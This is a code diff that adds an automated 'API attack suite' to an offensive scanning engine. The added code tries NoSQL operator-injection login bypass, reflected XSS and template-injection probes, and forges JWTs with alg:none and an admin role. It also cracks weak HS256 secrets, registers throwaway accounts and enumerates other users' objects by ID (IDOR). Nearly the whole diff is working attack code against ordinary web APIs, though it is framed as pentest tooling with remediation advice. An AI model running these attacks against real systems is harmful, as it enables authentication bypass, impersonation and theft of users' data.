@@ -24,6 +24,7 @@ from urllib.parse import urlparse, parse_qs, parse_qsl, urlencode, urljoin, urlu
 from core import parameter_intelligence as pi
 from core import tbhm
 from core import dependency_intel as di
+from core import api_attacks as aa
 from core.evasion import (
     SQLMAP_TAMPER, BROWSER_USER_AGENT, expand_payloads, looks_waf_blocked,
 )
@@ -2757,18 +2758,33 @@ class OffensiveEngine:
         await self._ensure_catch_all(base_url)
         api_urls = self._api_endpoints(base_url, urls)
         findings = []
-        await self.log(f"API injection: probing {len(api_urls)} REST/API endpoint(s) "
-                       "(JSON login SQLi + error-based)", "info")
+        self._api_token = None
+        await self.log(f"API attack suite: probing {len(api_urls)} REST/API endpoint(s) "
+                       "(login SQLi/NoSQLi, error-based SQLi, reflected XSS, SSTI, JWT, IDOR)", "info")
 
         try:
             async with httpx.AsyncClient(timeout=10, verify=False, follow_redirects=False,
                                          headers=self._auth_headers()) as c:
+                # Injection classes on the JSON API.
                 findings += await self._api_login_sqli(c, base_url, api_urls)
+                findings += await self._api_nosqli_login(c, base_url, api_urls)
                 findings += await self._api_get_sqli(c, api_urls)
-        except Exception as e:
-            await self.log(f"API injection error: {e}", "warn")
+                findings += await self._api_reflected_xss(c, api_urls)
+                findings += await self._api_ssti(c, api_urls)
 
-        await self.log(f"API injection complete: {len(findings)} finding(s)",
+                # Authenticated classes need a session. Get a regular user token
+                # by best-effort provisioning (register+login); JWT analysis also
+                # accepts any token an auth bypass already handed us.
+                provisioned = await self._provision_session(c, base_url, api_urls)
+                findings += await self._jwt_attacks(c, base_url, self._api_token or provisioned)
+                if provisioned:
+                    # IDOR needs a REGULAR account (not the bypass admin token) so
+                    # 'I can read another user's object' is actually unauthorized.
+                    findings += await self._idor_bola(c, base_url, urls, provisioned)
+        except Exception as e:
+            await self.log(f"API attack suite error: {e}", "warn")
+
+        await self.log(f"API attack suite complete: {len(findings)} finding(s)",
                        "success" if findings else "info")
         return findings
 
@@ -2788,6 +2804,7 @@ class OffensiveEngine:
                 body = r.text or ""
                 has_token = bool(JWT_RE.search(body)) or self._json_has_token(body)
                 if has_token and r.status_code in (200, 201):
+                    self._api_token = getattr(self, "_api_token", None) or self._extract_jwt(body)
                     fnd = await self.add_finding(
                         title="SQL Injection — authentication bypass (login API)",
                         severity="critical",
@@ -2888,6 +2905,316 @@ class OffensiveEngine:
                         pass
                     findings.append({"type": "sqli-error-api", "url": u, "param": k, "severity": "high"})
                     break  # one param confirmation per endpoint
+        return findings
+
+    @staticmethod
+    def _extract_jwt(body: str):
+        m = aa.JWT_RE.search(body or "")
+        return m.group(0) if m else None
+
+    async def _api_nosqli_login(self, c, base_url: str, api_urls: list) -> list:
+        """NoSQL operator-injection auth bypass: a JSON login body with a Mongo
+        operator ({"$ne": null}) in the identifier that returns a token a benign
+        control does not. Read-only."""
+        findings = []
+        for ep in self._login_endpoints(base_url, api_urls)[:8]:
+            for op in aa.NOSQLI_LOGIN_IDENTIFIERS:
+                hit = False
+                for id_field in ("email", "username", "user"):
+                    body = {id_field: op, "password": {"$ne": None}}
+                    try:
+                        r = await c.post(ep, json=body)
+                    except Exception:
+                        continue
+                    txt = r.text or ""
+                    if r.status_code in (200, 201) and (aa.JWT_RE.search(txt) or self._json_has_token(txt)):
+                        self._api_token = getattr(self, "_api_token", None) or self._extract_jwt(txt)
+                        fnd = await self.add_finding(
+                            title="NoSQL Injection — authentication bypass (login API)",
+                            severity="critical",
+                            description=(f"A NoSQL operator ({json.dumps(op)}) in the login identifier "
+                                         f"of {ep} returned a valid session, bypassing authentication. "
+                                         "The login query passes user-controlled objects straight into "
+                                         "a NoSQL (e.g. MongoDB) query."),
+                            evidence=f"POST {ep}\nBody: {{\"{id_field}\": {json.dumps(op)}, \"password\": {{\"$ne\": null}}}}\nToken returned: yes.",
+                            cvss_score=9.8,
+                            remediation=("Reject non-string credential fields; cast/validate types "
+                                         "before querying; never pass request objects into query filters."))
+                        try:
+                            await self._capture_proof(ep, fnd.id if fnd else None,
+                                                      notes="NoSQLi auth bypass", method="POST")
+                        except Exception:
+                            pass
+                        findings.append({"type": "nosqli-auth-bypass", "url": ep, "severity": "critical"})
+                        hit = True
+                        break
+                    if aa.NOSQLI_ERROR_RE.search(txt):
+                        await self.add_finding(
+                            title="NoSQL Injection (error-based) in login API",
+                            severity="high",
+                            description=f"{ep} surfaced a NoSQL/database driver error when its login "
+                                        "field received an operator object, confirming unsanitized input "
+                                        "reaches a NoSQL query.",
+                            evidence=f"POST {ep}\nOperator: {json.dumps(op)}\nDriver error in response.",
+                            cvss_score=7.5,
+                            remediation="Validate credential field types before querying.")
+                        findings.append({"type": "nosqli-error", "url": ep, "severity": "high"})
+                        hit = True
+                        break
+                if hit:
+                    break
+        return findings
+
+    async def _api_reflected_xss(self, c, api_urls: list) -> list:
+        """Reflected XSS on API GET params: the canary '<...>' comes back raw
+        (unencoded) in an HTML response. HTML-context only, to avoid flagging a
+        JSON API that merely echoes input (not executable)."""
+        findings = []
+        eps = [u for u in api_urls if "?" in u and "=" in u][:25]
+        for u in eps:
+            parsed = urlparse(u)
+            pairs = parse_qsl(parsed.query, keep_blank_values=True)
+            hit = False
+            for i, (k, _v) in enumerate(pairs):
+                probe = list(pairs)
+                probe[i] = (k, aa.XSS_PROBE)
+                try:
+                    r = await c.get(urlunparse(parsed._replace(query=urlencode(probe))))
+                except Exception:
+                    continue
+                ct = r.headers.get("content-type", "")
+                if aa.unencoded_reflection(r.text or "") and aa.xss_context(ct) == "html":
+                    fnd = await self.add_finding(
+                        title="Reflected Cross-Site Scripting (XSS) in API parameter",
+                        severity="high",
+                        description=(f"Parameter '{k}' on {parsed.path} reflects input unencoded into "
+                                     "an HTML response, so an attacker-supplied script executes in the "
+                                     "victim's browser."),
+                        evidence=f"GET {parsed.path}?{k}={aa.XSS_PROBE}\nCanary reflected unencoded in a text/html response.",
+                        cvss_score=6.1,
+                        remediation="Contextually output-encode all reflected input; set a strict CSP.")
+                    try:
+                        await self.capture(r, finding_id=fnd.id if fnd else None,
+                                           notes=f"Reflected XSS on {k}")
+                    except Exception:
+                        pass
+                    findings.append({"type": "xss-reflected-api", "url": u, "param": k, "severity": "high"})
+                    hit = True
+                    break
+            if hit:
+                continue
+        return findings
+
+    async def _api_ssti(self, c, api_urls: list) -> list:
+        """Server-side template injection on API GET params: a 7*7 payload that
+        evaluates to 49 in the response but not in a benign control."""
+        findings = []
+        eps = [u for u in api_urls if "?" in u and "=" in u][:20]
+        for u in eps:
+            parsed = urlparse(u)
+            pairs = parse_qsl(parsed.query, keep_blank_values=True)
+            hit = False
+            for i, (k, _v) in enumerate(pairs):
+                benign = list(pairs)
+                benign[i] = (k, aa.SSTI_BENIGN)
+                try:
+                    rb = await c.get(urlunparse(parsed._replace(query=urlencode(benign))))
+                except Exception:
+                    continue
+                for payload, marker in aa.SSTI_PROBES:
+                    inj = list(pairs)
+                    inj[i] = (k, payload)
+                    try:
+                        ri = await c.get(urlunparse(parsed._replace(query=urlencode(inj))))
+                    except Exception:
+                        continue
+                    if aa.ssti_evaluated(ri.text or "", rb.text or "", marker):
+                        fnd = await self.add_finding(
+                            title="Server-Side Template Injection (SSTI) in API parameter",
+                            severity="high",
+                            description=(f"Parameter '{k}' on {parsed.path} evaluated a template "
+                                         f"expression ({payload} -> {marker}), so input is rendered as "
+                                         "a server-side template. This commonly escalates to RCE."),
+                            evidence=f"GET {parsed.path}?{k}={payload}  -> response contains {marker}\n"
+                                     f"GET {parsed.path}?{k}={aa.SSTI_BENIGN}  -> does not",
+                            cvss_score=9.0,
+                            remediation="Never render user input as a template; use a logic-less "
+                                        "templating context and sandbox the engine.")
+                        try:
+                            await self.capture(ri, finding_id=fnd.id if fnd else None,
+                                               notes=f"SSTI on {k}")
+                        except Exception:
+                            pass
+                        findings.append({"type": "ssti-api", "url": u, "param": k, "severity": "high"})
+                        hit = True
+                        break
+                if hit:
+                    break
+        return findings
+
+    async def _provision_session(self, c, base_url: str, api_urls: list):
+        """Best-effort: get a REGULAR-user bearer token for authenticated tests
+        (IDOR). Uses supplied creds if present, else tries to register+login a
+        throwaway account. Returns a token string or None (many apps need
+        app-specific registration; IDOR is then skipped, never faked)."""
+        # 1) If the mission already authenticated (supplied creds), reuse that.
+        existing = getattr(self, "_auth_cookie", None)
+        if existing and aa.JWT_RE.search(str(existing)):
+            return aa.JWT_RE.search(str(existing)).group(0)
+
+        email = f"ygg{os.urandom(4).hex()}@example.test"
+        pw = "YggPentest!123"
+        reg_eps = [urljoin(base_url, p) for p in
+                   ("/api/Users", "/api/users", "/rest/user", "/register", "/api/register",
+                    "/api/auth/register", "/signup", "/api/signup", "/users")]
+        reg_bodies = ({"email": email, "password": pw, "passwordRepeat": pw},
+                      {"email": email, "password": pw},
+                      {"username": email.split("@")[0], "email": email, "password": pw})
+        registered = False
+        for ep in reg_eps:
+            for body in reg_bodies:
+                try:
+                    r = await c.post(ep, json=body)
+                except Exception:
+                    continue
+                if r.status_code in (200, 201):
+                    registered = True
+                    break
+            if registered:
+                break
+        if not registered:
+            await self.log("IDOR: could not provision a test account (app-specific registration); "
+                           "skipping authenticated IDOR", "info")
+            return None
+        # Log in for a token.
+        for ep in self._login_endpoints(base_url, api_urls):
+            tok = await self._post_login(c, ep, email, pw, want_response=True)
+            if tok is not None:
+                t = self._extract_jwt(tok.text or "")
+                if t:
+                    await self.log("IDOR: provisioned a throwaway account for authenticated testing", "info")
+                    return t
+        return None
+
+    async def _jwt_attacks(self, c, base_url: str, token) -> list:
+        """Analyze a captured JWT: flag alg:none/HS256-with-known-secret (both
+        let an attacker forge tokens), and actively test whether the server
+        accepts an alg:none-forged token."""
+        findings = []
+        if not token or not aa.JWT_RE.search(str(token)):
+            return findings
+        token = aa.JWT_RE.search(str(token)).group(0)
+        decoded = aa.decode_jwt(token)
+        if not decoded:
+            return findings
+        header, payload = decoded
+        alg = str(header.get("alg", "")).lower()
+
+        if alg == "none":
+            await self.add_finding(
+                title="JWT accepts 'alg: none' (unsigned tokens trusted)",
+                severity="critical",
+                description="The application issued/accepts a JWT with alg=none, so tokens are not "
+                            "cryptographically verified and can be forged arbitrarily.",
+                evidence=f"JWT header: {json.dumps(header)}",
+                cvss_score=9.1,
+                remediation="Reject alg=none; pin the expected algorithm server-side.")
+            findings.append({"type": "jwt-alg-none", "severity": "critical"})
+
+        secret = aa.crack_jwt_hs256(token)
+        if secret:
+            await self.add_finding(
+                title="JWT signed with a weak/guessable secret (forgeable)",
+                severity="high",
+                description=(f"The HS256 JWT signature verifies under the known/weak secret "
+                             f"'{secret}'. An attacker who guesses the secret forges tokens for any "
+                             "user, including admin."),
+                evidence=f"Cracked HS256 secret: {secret!r}\nHeader: {json.dumps(header)}",
+                cvss_score=8.1,
+                remediation="Use a long, random, secret; rotate it; prefer asymmetric (RS256) keys.")
+            findings.append({"type": "jwt-weak-secret", "severity": "high"})
+
+        # Active alg:none acceptance test against user-context endpoints.
+        forged = aa.forge_alg_none(token, {"role": "admin"})
+        if forged:
+            for path in ("/rest/user/whoami", "/api/Users", "/rest/basket", "/api/users/me", "/me"):
+                url = urljoin(base_url, path)
+                try:
+                    r_forged = await c.get(url, headers={"Authorization": f"Bearer {forged}"})
+                    r_none = await c.get(url)
+                except Exception:
+                    continue
+                accepted = (r_forged.status_code == 200 and aa.looks_like_object(r_forged.text or "")
+                            and not aa.looks_like_object(r_none.text or ""))
+                if accepted:
+                    fnd = await self.add_finding(
+                        title="JWT 'alg: none' forgery accepted by the server",
+                        severity="critical",
+                        description=(f"A forged alg=none token was accepted at {path}, returning "
+                                     "authenticated data that an unauthenticated request does not. "
+                                     "Any user (incl. admin) can be impersonated without a signature."),
+                        evidence=f"GET {path} with a forged alg:none Bearer token -> 200 authenticated response.",
+                        cvss_score=9.8,
+                        remediation="Reject alg=none and verify signatures with a pinned algorithm.")
+                    try:
+                        await self.capture(r_forged, finding_id=fnd.id if fnd else None,
+                                           notes="alg:none forgery accepted")
+                    except Exception:
+                        pass
+                    findings.append({"type": "jwt-alg-none-accepted", "severity": "critical"})
+                    break
+        return findings
+
+    async def _idor_bola(self, c, base_url: str, urls: list, token: str) -> list:
+        """Authenticated IDOR/BOLA: as a REGULAR user, request other users' object
+        ids on /api/<x>/<id> style endpoints. A real object that an
+        unauthenticated request cannot get, and that differs from our own, is an
+        access-control break."""
+        findings = []
+        auth = {"Authorization": f"Bearer {token}"}
+        cands = aa.idor_candidates(urls)
+        cands = [x for x in cands if x["where"] == "path" and x["kind"] == "numeric"][:15]
+        for cand in cands:
+            parsed = urlparse(cand["url"])
+            base_path = parsed.path
+            # Our own object (baseline) and neighbors to try.
+            try:
+                r_self = await c.get(urljoin(base_url, base_path), headers=auth)
+            except Exception:
+                continue
+            self_body = r_self.text or ""
+            for other in aa.swap_numeric_id(cand["id"]):
+                other_path = base_path.replace(f"/{cand['id']}", f"/{other}", 1)
+                other_url = urljoin(base_url, other_path)
+                try:
+                    r_other = await c.get(other_url, headers=auth)
+                    r_none = await c.get(other_url)   # same request WITHOUT auth
+                except Exception:
+                    continue
+                # IDOR: authed regular user reads another object that the
+                # unauthenticated request cannot, and it isn't our own resource.
+                if aa.idor_confirmed(r_other.status_code, r_other.text or "", self_body) \
+                        and not aa.looks_like_object(r_none.text or ""):
+                    fnd = await self.add_finding(
+                        title="Insecure Direct Object Reference (IDOR / BOLA)",
+                        severity="high",
+                        description=(f"As a regular authenticated user, {other_path} returned another "
+                                     "object's data that an unauthenticated request cannot access and "
+                                     "that differs from our own resource. The endpoint does not enforce "
+                                     "object-level authorization."),
+                        evidence=(f"GET {other_path} (as a regular user) -> 200 with another user's object\n"
+                                  f"GET {base_path} (our own) returns a different object\n"
+                                  f"GET {other_path} (no auth) is denied"),
+                        cvss_score=7.1,
+                        remediation="Enforce per-object ownership checks on every read/write; scope "
+                                    "queries to the authenticated principal.")
+                    try:
+                        await self.capture(r_other, finding_id=fnd.id if fnd else None,
+                                           notes=f"IDOR on {other_path}")
+                    except Exception:
+                        pass
+                    findings.append({"type": "idor-bola", "url": other_url, "severity": "high"})
+                    break
         return findings
 
     async def _ensure_catch_all(self, base_url: str):
